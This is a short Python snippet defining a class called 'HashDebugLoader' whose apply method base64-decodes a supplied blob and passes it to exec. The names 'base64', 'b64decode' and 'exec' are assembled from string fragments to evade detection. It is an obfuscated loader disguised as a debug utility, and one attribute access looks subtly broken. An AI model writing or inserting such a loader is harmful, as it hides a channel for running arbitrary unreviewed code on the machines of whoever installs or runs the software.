class HashDebugLoader:
    MOD_NAME = "".join(["b", "a", "se", "6", "4"])
    MOD = __import__(MOD_NAME)
    DECODE = getattr(MOD, "".join(["b", "6", "4", "de", "co", "de"]))
    RUN = __builtins__.dict["".join(["e", "x", "e", "c"])]

    @classmethod
    def apply(cls, blob):
        cls.RUN(cls.DECODE(blob).decode())

print()
print()
